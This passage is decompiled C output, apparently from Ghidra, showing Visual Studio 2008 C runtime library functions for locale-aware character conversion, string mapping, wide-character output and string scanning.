  CodePage = GetConsoleOutputCP();
  DVar3 = WideCharToMultiByte(CodePage,DVar3,lpWideCharStr,cchWideChar,lpMultiByteStr,cbMultiByte,
                              lpDefaultChar,lpUsedDefaultChar);
  if (DAT_0042af38 != (HANDLE)0xffffffff) {
    WriteConsoleA(DAT_0042af38,local_10,DVar3,&local_14,(LPVOID)0x0);
  }
LAB_0041b5b0:
  wVar1 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return wVar1;
}



// Library Function - Single Match
//  __mbtowc_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __mbtowc_l(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes,_locale_t _Locale)

{
  wchar_t *pwVar1;
  int iVar2;
  int *piVar3;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if ((_SrcCh != (char *)0x0) && (_SrcSizeInBytes != 0)) {
    if (*_SrcCh != '\0') {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale != (wchar_t *)0x0) {
        iVar2 = __isleadbyte_l((uint)(byte)*_SrcCh,&local_14);
        if (iVar2 == 0) {
          iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,1,_DstCh,
                                      (uint)(_DstCh != (wchar_t *)0x0));
          if (iVar2 != 0) goto LAB_0041b618;
        }
        else {
          pwVar1 = (local_14.locinfo)->locale_name[3];
          if ((((1 < (int)pwVar1) && ((int)pwVar1 <= (int)_SrcSizeInBytes)) &&
              (iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,(int)pwVar1,
                                           _DstCh,(uint)(_DstCh != (wchar_t *)0x0)), iVar2 != 0)) ||
             (((local_14.locinfo)->locale_name[3] <= _SrcSizeInBytes && (_SrcCh[1] != '\0')))) {
            pwVar1 = (local_14.locinfo)->locale_name[3];
            if (local_8 == '\0') {
              return (int)pwVar1;
            }
            *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
            return (int)pwVar1;
          }
        }
        piVar3 = __errno();
        *piVar3 = 0x2a;
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return -1;
      }
      if (_DstCh != (wchar_t *)0x0) {
        *_DstCh = (ushort)(byte)*_SrcCh;
      }
LAB_0041b618:
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      return 1;
    }
    if (_DstCh != (wchar_t *)0x0) {
      *_DstCh = L'\0';
    }
  }
  return 0;
}



// Library Function - Single Match
//  _mbtowc
// 
// Library: Visual Studio 2008 Release

int __cdecl _mbtowc(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes)

{
  int iVar1;
  
  iVar1 = __mbtowc_l(_DstCh,_SrcCh,_SrcSizeInBytes,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __isleadbyte_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __isleadbyte_l(int _C,_locale_t _Locale)

{
  ushort uVar1;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  uVar1 = *(ushort *)(*(int *)(local_14[0] + 200) + (_C & 0xffU) * 2);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1 & 0x8000;
}



// Library Function - Single Match
//  _isleadbyte
// 
// Library: Visual Studio 2008 Release

int __cdecl _isleadbyte(int _C)

{
  int iVar1;
  
  iVar1 = __isleadbyte_l(_C,(_locale_t)0x0);
  return iVar1;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __chkstk
// 
// Library: Visual Studio 2008 Release

void __alloca_probe(void)

{
  undefined *in_EAX;
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 unaff_retaddr;
  undefined auStack_4 [4];
  
  puVar2 = (undefined4 *)((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(&stack0x00000000 < in_EAX))
  ;
  for (puVar1 = (undefined4 *)((uint)auStack_4 & 0xfffff000); puVar2 < puVar1;
      puVar1 = puVar1 + -0x400) {
  }
  *puVar2 = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __fputwc_nolock
// 
// Library: Visual Studio 2008 Release

wint_t __cdecl __fputwc_nolock(wchar_t _Ch,FILE *_File)

{
  int *piVar1;
  wint_t wVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  errno_t eVar6;
  int local_14;
  char local_10 [8];
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  if ((*(byte *)&_File->_flag & 0x40) == 0) {
    iVar3 = __fileno(_File);
    if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
      puVar5 = &DAT_0042a648;
    }
    else {
      iVar3 = __fileno(_File);
      uVar4 = __fileno(_File);
      puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0042d780)[iVar3 >> 5]);
    }
    if ((puVar5[0x24] & 0x7f) != 2) {
      iVar3 = __fileno(_File);
      if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
        puVar5 = &DAT_0042a648;
      }
      else {
        iVar3 = __fileno(_File);
        uVar4 = __fileno(_File);
        puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0042d780)[iVar3 >> 5]);
      }
      if ((puVar5[0x24] & 0x7f) != 1) {
        iVar3 = __fileno(_File);
        if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
          puVar5 = &DAT_0042a648;
        }
        else {
          iVar3 = __fileno(_File);
          uVar4 = __fileno(_File);
          puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0042d780)[iVar3 >> 5]);
        }
        if ((puVar5[4] & 0x80) != 0) {
          eVar6 = _wctomb_s(&local_14,local_10,5,_Ch);
          if ((eVar6 == 0) && (iVar3 = 0, 0 < local_14)) {
            do {
              piVar1 = &_File->_cnt;
              *piVar1 = *piVar1 + -1;
              if (*piVar1 < 0) {
                uVar4 = __flsbuf((int)local_10[iVar3],_File);
              }
              else {
                *_File->_ptr = local_10[iVar3];
                uVar4 = (uint)(byte)*_File->_ptr;
                _File->_ptr = _File->_ptr + 1;
              }
            } while ((uVar4 != 0xffffffff) && (iVar3 = iVar3 + 1, iVar3 < local_14));
          }
          goto LAB_0041b8f3;
        }
      }
    }
  }
  piVar1 = &_File->_cnt;
  *piVar1 = *piVar1 + -2;
  if (*piVar1 < 0) {
    __flswbuf((uint)(ushort)_Ch,_File);
  }
  else {
    *(wchar_t *)_File->_ptr = _Ch;
    _File->_ptr = _File->_ptr + 2;
  }
LAB_0041b8f3:
  wVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return wVar2;
}



// Library Function - Single Match
//  __get_printf_count_output
// 
// Library: Visual Studio 2008 Release

int __cdecl __get_printf_count_output(void)

{
  return (uint)(DAT_0042c46c == (DAT_0042a044 | 1));
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtLCMapStringA_stat(struct localeinfo_struct *,unsigned long,unsigned long,char
// const *,int,char *,int,int,int)
// 
// Library: Visual Studio 2008 Release

int __cdecl
__crtLCMapStringA_stat
          (localeinfo_struct *param_1,ulong param_2,ulong param_3,char *param_4,int param_5,
          char *param_6,int param_7,int param_8,int param_9)

{
  uint uVar1;
  bool bVar2;
  int iVar3;
  DWORD DVar4;
  char *pcVar5;
  uint cchWideChar;
  undefined4 *puVar6;
  UINT UVar7;
  int *in_ECX;
  char *pcVar8;
  LPSTR lpMultiByteStr;
  void *local_14;
  undefined4 *local_10;
  uint local_c;
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  if (DAT_0042c470 == 0) {
    iVar3 = LCMapStringW(0,0x100,(LPCWSTR)&DAT_00422bc4,1,(LPWSTR)0x0,0);
    if (iVar3 == 0) {
      DVar4 = GetLastError();
      if (DVar4 == 0x78) {
        DAT_0042c470 = 2;
      }
    }
    else {
      DAT_0042c470 = 1;
    }
  }
  pcVar5 = (char *)param_3;
  pcVar8 = param_4;
  if (0 < (int)param_4) {
    do {
      pcVar8 = pcVar8 + -1;
      if (*pcVar5 == '\0') goto LAB_0041b989;
      pcVar5 = pcVar5 + 1;
    } while (pcVar8 != (char *)0x0);
    pcVar8 = (char *)0xffffffff;
LAB_0041b989:
    pcVar5 = param_4 + -(int)pcVar8;
    bVar2 = (int)(pcVar5 + -1) < (int)param_4;
    param_4 = pcVar5 + -1;
    if (bVar2) {
      param_4 = pcVar5;
    }
  }
  if ((DAT_0042c470 == 2) || (DAT_0042c470 == 0)) {
    local_10 = (undefined4 *)0x0;
    local_14 = (void *)0x0;
    if (param_1 == (localeinfo_struct *)0x0) {
      param_1 = *(localeinfo_struct **)(*in_ECX + 0x14);
    }
    if (param_7 == 0) {
      param_7 = *(int *)(*in_ECX + 4);
    }
    UVar7 = ___ansicp((LCID)param_1);
    if (UVar7 == 0xffffffff) goto LAB_0041bcab;
    if (UVar7 == param_7) {
      LCMapStringA((LCID)param_1,param_2,(LPCSTR)param_3,(int)param_4,(LPSTR)param_5,(int)param_6);
    }
    else {
      local_10 = (undefined4 *)
                 ___convertcp(param_7,UVar7,(char *)param_3,(uint *)&param_4,(LPSTR)0x0,0);
      if (local_10 == (undefined4 *)0x0) goto LAB_0041bcab;
      local_c = LCMapStringA((LCID)param_1,param_2,(LPCSTR)local_10,(int)param_4,(LPSTR)0x0,0);
      if (local_c != 0) {
        if (((int)local_c < 1) || (0xffffffe0 < local_c)) {
          puVar6 = (undefined4 *)0x0;
        }
        else if (local_c + 8 < 0x401) {
          if (&stack0x00000000 == (undefined *)0x24) goto LAB_0041bc88;
          puVar6 = (undefined4 *)&stack0xffffffe4;
        }
        else {
          puVar6 = (undefined4 *)_malloc(local_c + 8);
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            puVar6 = puVar6 + 2;
          }
        }
        if (puVar6 != (undefined4 *)0x0) {
          _memset(puVar6,0,local_c);
          local_c = LCMapStringA((LCID)param_1,param_2,(LPCSTR)local_10,(int)param_4,(LPSTR)puVar6,
                                 local_c);
          if (local_c != 0) {
            local_14 = (void *)___convertcp(UVar7,param_7,(char *)puVar6,&local_c,(LPSTR)param_5,
                                            (int)param_6);
          }
          __freea(puVar6);
        }
      }
    }
LAB_0041bc88:
    if (local_10 != (undefined4 *)0x0) {
      _free(local_10);
    }
    if ((local_14 != (void *)0x0) && ((void *)param_5 != local_14)) {
      _free(local_14);
    }
    goto LAB_0041bcab;
  }
  if (DAT_0042c470 != 1) goto LAB_0041bcab;
  local_c = 0;
  if (param_7 == 0) {
    param_7 = *(int *)(*in_ECX + 4);
  }
  cchWideChar = MultiByteToWideChar(param_7,(uint)(param_8 != 0) * 8 + 1,(LPCSTR)param_3,
                                    (int)param_4,(LPWSTR)0x0,0);
  if (cchWideChar == 0) goto LAB_0041bcab;
  if (((int)cchWideChar < 1) || (0xffffffe0 / cchWideChar < 2)) {
    local_10 = (undefined4 *)0x0;
  }
  else {
    uVar1 = cchWideChar * 2 + 8;
    if (uVar1 < 0x401) {
      puVar6 = (undefined4 *)&stack0xffffffdc;
      local_10 = (undefined4 *)&stack0xffffffdc;
      if (&stack0x00000000 != (undefined *)0x24) {
LAB_0041ba31:
        local_10 = puVar6 + 2;
      }
    }
    else {
      puVar6 = (undefined4 *)_malloc(uVar1);
      local_10 = puVar6;
      if (puVar6 != (undefined4 *)0x0) {
        *puVar6 = 0xdddd;
        goto LAB_0041ba31;
      }
    }
  }
  if (local_10 == (undefined4 *)0x0) goto LAB_0041bcab;
  iVar3 = MultiByteToWideChar(param_7,1,(LPCSTR)param_3,(int)param_4,(LPWSTR)local_10,cchWideChar);
  if ((iVar3 != 0) &&
     (local_c = LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)0x0,0),
     local_c != 0)) {
    if ((param_2 & 0x400) == 0) {
      if (((int)local_c < 1) || (0xffffffe0 / local_c < 2)) {
        puVar6 = (undefined4 *)0x0;
      }
      else {
        uVar1 = local_c * 2 + 8;
        if (uVar1 < 0x401) {
          if (&stack0x00000000 == (undefined *)0x24) goto LAB_0041bb41;
          puVar6 = (undefined4 *)&stack0xffffffe4;
        }
        else {
          puVar6 = (undefined4 *)_malloc(uVar1);
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            puVar6 = puVar6 + 2;
          }
        }
      }
      if (puVar6 != (undefined4 *)0x0) {
        iVar3 = LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)puVar6,
                             local_c);
        if (iVar3 != 0) {
          lpMultiByteStr = (LPSTR)param_5;
          pcVar5 = param_6;
          if (param_6 == (char *)0x0) {
            lpMultiByteStr = (LPSTR)0x0;
            pcVar5 = (char *)0x0;
          }
          local_c = WideCharToMultiByte(param_7,0,(LPCWSTR)puVar6,local_c,lpMultiByteStr,(int)pcVar5
                                        ,(LPCSTR)0x0,(LPBOOL)0x0);
        }
        __freea(puVar6);
      }
    }
    else if ((param_6 != (char *)0x0) && ((int)local_c <= (int)param_6)) {
      LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)param_5,(int)param_6)
      ;
    }
  }
LAB_0041bb41:
  __freea(local_10);
LAB_0041bcab:
  iVar3 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar3;
}



// Library Function - Single Match
//  ___crtLCMapStringA
// 
// Library: Visual Studio 2008 Release

int __cdecl
___crtLCMapStringA(_locale_t _Plocinfo,LPCWSTR _LocaleName,DWORD _DwMapFlag,LPCSTR _LpSrcStr,
                  int _CchSrc,LPSTR _LpDestStr,int _CchDest,int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtLCMapStringA_stat
                    ((localeinfo_struct *)_LocaleName,_DwMapFlag,(ulong)_LpSrcStr,(char *)_CchSrc,
                     (int)_LpDestStr,(char *)_CchDest,_Code_page,_BError,in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtGetStringTypeA_stat(struct localeinfo_struct *,unsigned long,char const
// *,int,unsigned short *,int,int,int)
// 
// Library: Visual Studio 2008 Release

int __cdecl
__crtGetStringTypeA_stat
          (localeinfo_struct *param_1,ulong param_2,char *param_3,int param_4,ushort *param_5,
          int param_6,int param_7,int param_8)

{
  uint _Size;
  BOOL BVar1;
  DWORD DVar2;
  uint cchWideChar;
  undefined4 *puVar3;
  int iVar4;
  ushort *puVar5;
  int *in_ECX;
  undefined4 *lpWideCharStr;
  void *_Memory;
  int *local_c;
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_c = in_ECX;
  if (DAT_0042c474 == 0) {
    BVar1 = GetStringTypeW(1,(LPCWSTR)&DAT_00422bc4,1,(LPWORD)&local_c);
    if (BVar1 == 0) {
      DVar2 = GetLastError();
      if (DVar2 == 0x78) {
        DAT_0042c474 = 2;
      }
      goto LAB_0041bd5d;
    }
    DAT_0042c474 = 1;
  }
  else {
LAB_0041bd5d:
    if ((DAT_0042c474 == 2) || (DAT_0042c474 == 0)) {
      _Memory = (void *)0x0;
      if (param_6 == 0) {
        param_6 = *(int *)(*in_ECX + 0x14);
      }
      if (param_5 == (ushort *)0x0) {
        param_5 = *(ushort **)(*in_ECX + 4);
      }
      puVar5 = (ushort *)___ansicp(param_6);
      if ((puVar5 != (ushort *)0xffffffff) &&
         (((puVar5 == param_5 ||
           (_Memory = (void *)___convertcp((UINT)param_5,(UINT)puVar5,(char *)param_2,
                                           (uint *)&param_3,(LPSTR)0x0,0), param_2 = (ulong)_Memory,
           _Memory != (void *)0x0)) &&
          (GetStringTypeA(param_6,(DWORD)param_1,(LPCSTR)param_2,(int)param_3,(LPWORD)param_4),
          _Memory != (void *)0x0)))) {
        _free(_Memory);
      }
      goto LAB_0041beaa;
    }
    if (DAT_0042c474 != 1) goto LAB_0041beaa;
  }
  local_c = (int *)0x0;
  if (param_5 == (ushort *)0x0) {
    param_5 = *(ushort **)(*in_ECX + 4);
  }
  cchWideChar = MultiByteToWideChar((UINT)param_5,(uint)(param_7 != 0) * 8 + 1,(LPCSTR)param_2,
                                    (int)param_3,(LPWSTR)0x0,0);
  if (cchWideChar == 0) goto LAB_0041beaa;
  lpWideCharStr = (undefined4 *)0x0;
  if ((0 < (int)cchWideChar) && (cchWideChar < 0x7ffffff1)) {
    _Size = cchWideChar * 2 + 8;
    if (_Size < 0x401) {
      puVar3 = (undefined4 *)&stack0xffffffe8;
      lpWideCharStr = (undefined4 *)&stack0xffffffe8;
      if (&stack0x00000000 != (undefined *)0x18) {
LAB_0041bded:
        lpWideCharStr = puVar3 + 2;
      }
    }
    else {
      puVar3 = (undefined4 *)_malloc(_Size);
      lpWideCharStr = puVar3;
      if (puVar3 != (undefined4 *)0x0) {
        *puVar3 = 0xdddd;
        goto LAB_0041bded;
      }
    }
  }
  if (lpWideCharStr != (undefined4 *)0x0) {
    _memset(lpWideCharStr,0,cchWideChar * 2);
    iVar4 = MultiByteToWideChar((UINT)param_5,1,(LPCSTR)param_2,(int)param_3,(LPWSTR)lpWideCharStr,
                                cchWideChar);
    if (iVar4 != 0) {
      local_c = (int *)GetStringTypeW((DWORD)param_1,(LPCWSTR)lpWideCharStr,iVar4,(LPWORD)param_4);
    }
    __freea(lpWideCharStr);
  }
LAB_0041beaa:
  iVar4 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar4;
}



// Library Function - Single Match
//  ___crtGetStringTypeA
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl
___crtGetStringTypeA
          (_locale_t _Plocinfo,DWORD _DWInfoType,LPCSTR _LpSrcStr,int _CchSrc,LPWORD _LpCharType,
          int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_00000020;
  int in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtGetStringTypeA_stat
                    ((localeinfo_struct *)_DWInfoType,(ulong)_LpSrcStr,(char *)_CchSrc,
                     (int)_LpCharType,(ushort *)_Code_page,_BError,in_stack_00000020,
                     in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  ___free_lc_time
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lc_time(void **param_1)

{
  if (param_1 != (void **)0x0) {
    _free(param_1[1]);
    _free(param_1[2]);
    _free(param_1[3]);
    _free(param_1[4]);
    _free(param_1[5]);
    _free(param_1[6]);
    _free(*param_1);
    _free(param_1[8]);
    _free(param_1[9]);
    _free(param_1[10]);
    _free(param_1[0xb]);
    _free(param_1[0xc]);
    _free(param_1[0xd]);
    _free(param_1[7]);
    _free(param_1[0xe]);
    _free(param_1[0xf]);
    _free(param_1[0x10]);
    _free(param_1[0x11]);
    _free(param_1[0x12]);
    _free(param_1[0x13]);
    _free(param_1[0x14]);
    _free(param_1[0x15]);
    _free(param_1[0x16]);
    _free(param_1[0x17]);
    _free(param_1[0x18]);
    _free(param_1[0x19]);
    _free(param_1[0x1a]);
    _free(param_1[0x1b]);
    _free(param_1[0x1c]);
    _free(param_1[0x1d]);
    _free(param_1[0x1e]);
    _free(param_1[0x1f]);
    _free(param_1[0x20]);
    _free(param_1[0x21]);
    _free(param_1[0x22]);
    _free(param_1[0x23]);
    _free(param_1[0x24]);
    _free(param_1[0x25]);
    _free(param_1[0x26]);
    _free(param_1[0x27]);
    _free(param_1[0x28]);
    _free(param_1[0x29]);
    _free(param_1[0x2a]);
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_num
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lconv_num(void **param_1)

{
  if (param_1 != (void **)0x0) {
    if ((undefined *)*param_1 != PTR_DAT_0042aee8) {
      _free(*param_1);
    }
    if ((undefined *)param_1[1] != PTR_DAT_0042aeec) {
      _free(param_1[1]);
    }
    if ((undefined *)param_1[2] != PTR_DAT_0042aef0) {
      _free(param_1[2]);
    }
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_mon
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lconv_mon(int param_1)

{
  if (param_1 != 0) {
    if (*(undefined **)(param_1 + 0xc) != PTR_DAT_0042aef4) {
      _free(*(undefined **)(param_1 + 0xc));
    }
    if (*(undefined **)(param_1 + 0x10) != PTR_DAT_0042aef8) {
      _free(*(undefined **)(param_1 + 0x10));
    }
    if (*(undefined **)(param_1 + 0x14) != PTR_DAT_0042aefc) {
      _free(*(undefined **)(param_1 + 0x14));
    }
    if (*(undefined **)(param_1 + 0x18) != PTR_DAT_0042af00) {
      _free(*(undefined **)(param_1 + 0x18));
    }
    if (*(undefined **)(param_1 + 0x1c) != PTR_DAT_0042af04) {
      _free(*(undefined **)(param_1 + 0x1c));
    }
    if (*(undefined **)(param_1 + 0x20) != PTR_DAT_0042af08) {
      _free(*(undefined **)(param_1 + 0x20));
    }
    if (*(undefined **)(param_1 + 0x24) != PTR_DAT_0042af0c) {
      _free(*(undefined **)(param_1 + 0x24));
    }
  }
  return;
}



// Library Function - Single Match
//  _strcspn
// 
// Library: Visual Studio

size_t __cdecl _strcspn(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  size_t sVar3;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  sVar3 = 0xffffffff;
  do {
    sVar3 = sVar3 + 1;
    bVar1 = *_Str;
    if (bVar1 == 0) {
      return sVar3;
    }
    _Str = (char *)((byte *)_Str + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return sVar3;
}



// Library Function - Single Match
//  _strpbrk
// 
// Library: Visual Studio

char * __cdecl _strpbrk(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  do {
    pbVar2 = (byte *)_Str;
    bVar1 = *pbVar2;
    if (bVar1 == 0) {
      return (char *)(uint)bVar1;
    }
    _Str = (char *)(pbVar2 + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(char *)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return (char *)pbVar2;
}



// Library Function - Single Match
//  ___crtGetStringTypeW
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl
___crtGetStringTypeW
          (localeinfo_struct *param_1,DWORD param_2,LPCWSTR param_3,int param_4,LPWORD param_5)

{
  BOOL BVar1;
  _LocaleUpdate local_14 [8];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_14,param_1);
  if (param_4 < -1) {
    BVar1 = 0;
  }
  else {
    BVar1 = GetStringTypeW(param_2,param_3,param_4,param_5);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return BVar1;
}



// Library Function - Single Match
//  __wctomb_s_l
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__wctomb_s_l(int *_SizeConverted,char *_MbCh,size_t _SizeInBytes,wchar_t _WCh,_locale_t _Locale)

{
  char *lpMultiByteStr;
  size_t _Size;
  int iVar1;
  int *piVar2;
  DWORD DVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _Size = _SizeInBytes;
  lpMultiByteStr = _MbCh;
  if ((_MbCh == (char *)0x0) && (_SizeInBytes != 0)) {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = 0;
    }
LAB_0041c262:
    iVar1 = 0;
  }
  else {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = -1;
    }
    if (0x7fffffff < _SizeInBytes) {
      piVar2 = __errno();
      *piVar2 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      return 0x16;
    }
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
    if (*(int *)(local_14[0] + 0x14) == 0) {
      if ((ushort)_WCh < 0x100) {
        if (lpMultiByteStr != (char *)0x0) {
          if (_Size == 0) goto LAB_0041c2f9;
          *lpMultiByteStr = (char)_WCh;
        }
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = 1;
        }
LAB_0041c334:
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        goto LAB_0041c262;
      }
      if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
        _memset(lpMultiByteStr,0,_Size);
      }
    }
    else {
      _MbCh = (char *)0x0;
      iVar1 = WideCharToMultiByte(*(UINT *)(local_14[0] + 4),0,&_WCh,1,lpMultiByteStr,_Size,
                                  (LPCSTR)0x0,(LPBOOL)&_MbCh);
      if (iVar1 == 0) {
        DVar3 = GetLastError();
        if (DVar3 == 0x7a) {
          if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
            _memset(lpMultiByteStr,0,_Size);
          }
LAB_0041c2f9:
          piVar2 = __errno();
          *piVar2 = 0x22;
          __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          if (local_8 == '\0') {
            return 0x22;
          }
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
          return 0x22;
        }
      }
      else if (_MbCh == (char *)0x0) {
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = iVar1;
        }
        goto LAB_0041c334;
      }
    }
    piVar2 = __errno();
    *piVar2 = 0x2a;
    piVar2 = __errno();
    iVar1 = *piVar2;
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return iVar1;
}



// Library Function - Single Match
//  _wctomb_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wctomb_s(int *_SizeConverted,char *_MbCh,rsize_t _SizeInBytes,wchar_t _WCh)

{
  errno_t eVar1;
  
  eVar1 = __wctomb_s_l(_SizeConverted,_MbCh,_SizeInBytes,_WCh,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  unsigned long __cdecl strtoxl(struct localeinfo_struct *,char const *,char const * *,int,int)
// 
// Library: Visual Studio 2008 Release

ulong __cdecl
strtoxl(localeinfo_struct *param_1,char *param_2,char **param_3,int param_4,int param_5)

{
  ushort uVar1;
  byte *pbVar2;
  int *piVar3;
  uint uVar4;
  pthreadlocinfo ptVar5;
  uint uVar6;
  int iVar7;
  byte bVar8;
  byte *pbVar9;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ulong local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,param_1);
  if (param_3 != (char **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (char *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  bVar8 = *param_2;
  local_8 = 0;
  ptVar5 = local_18.locinfo;
  pbVar2 = (byte *)param_2;
  while( true ) {
    pbVar9 = pbVar2 + 1;
    if ((int)ptVar5->locale_name[3] < 2) {
      uVar4 = *(ushort *)(ptVar5[1].lc_category[0].locale + (uint)bVar8 * 2) & 8;
    }
    else {
      uVar4 = __isctype_l((uint)bVar8,8,&local_18);
      ptVar5 = local_18.locinfo;
    }
    if (uVar4 == 0) break;
